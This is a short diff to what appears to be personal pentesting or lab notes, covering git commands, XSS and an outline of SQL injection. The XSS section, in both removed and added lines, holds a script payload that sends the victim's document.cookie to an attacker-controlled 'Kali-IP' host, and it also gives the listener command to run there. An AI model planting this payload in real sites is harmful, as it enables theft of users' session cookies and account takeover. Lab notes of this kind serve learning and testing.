@@ -234,8 +234,8 @@ git commit
 git push origin master
 ```
 #### XSS 
-> Put the following code in XSS 1. <script> document.write('<img src="http://Kali-IP/?c='+document.cookie+'" />'); </script>
-> On kali: python3 -m http.server 80
+> Put the following code in XSS ```1. <script> document.write('<img src="http://Kali-IP/?c='+document.cookie+'" />'); </script>```
+> On kali: ```python3 -m http.server 80```
 > 
 #### SQL injection
 > 1. Flow: DB -> Table -> Column Name - Data
